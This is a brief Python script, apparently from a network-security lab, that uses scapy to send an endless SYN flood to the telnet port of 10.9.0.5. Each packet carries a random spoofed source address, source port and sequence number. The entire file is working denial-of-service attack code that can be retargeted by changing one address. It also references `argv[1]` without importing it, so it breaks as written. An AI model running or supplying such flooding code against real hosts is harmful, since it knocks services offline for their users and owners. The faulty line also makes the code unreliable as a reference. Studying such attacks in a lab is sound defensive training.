#!/usr/bin/env python3
from scapy.all import IP, TCP, send
from ipaddress import IPv4Address
from random import getrandbits
import sys
print(sys.argv)
ip = IP(dst="10.9.0.5")      # victim
tcp = TCP(dport=23, flags='S')      # 23 for telnet
pkt = ip/tcp
while True:
      pkt[IP].src = str(IPv4Address(getrandbits(32))) # source iP
      pkt[TCP].sport = getrandbits(16) # source port
      pkt[TCP].seq = getrandbits(32) # sequence number
      send(pkt, iface = argv[1] , verbose = 0)   # br-3cba7ed65b16
